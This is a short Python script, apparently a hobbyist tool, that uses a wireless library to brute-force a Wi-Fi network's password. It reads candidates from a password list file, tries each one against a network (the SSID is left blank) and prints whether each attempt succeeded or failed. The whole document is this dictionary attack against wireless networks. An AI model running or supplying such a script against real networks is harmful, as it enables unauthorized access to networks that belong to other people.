from wireless import Wireless

wire = Wireless()
with open('passwordlist.txt', 'r') as file:
    for line in file.readlines():
        # This will only work with wireless and not ethernet cable
        if wire.connect(ssid='', password=line.strip()) == True: 
            print('[+] ' + line.strip() + ' - Successs!')
        else:
            print('[-] ' + line.strip() + ' - Failed!')
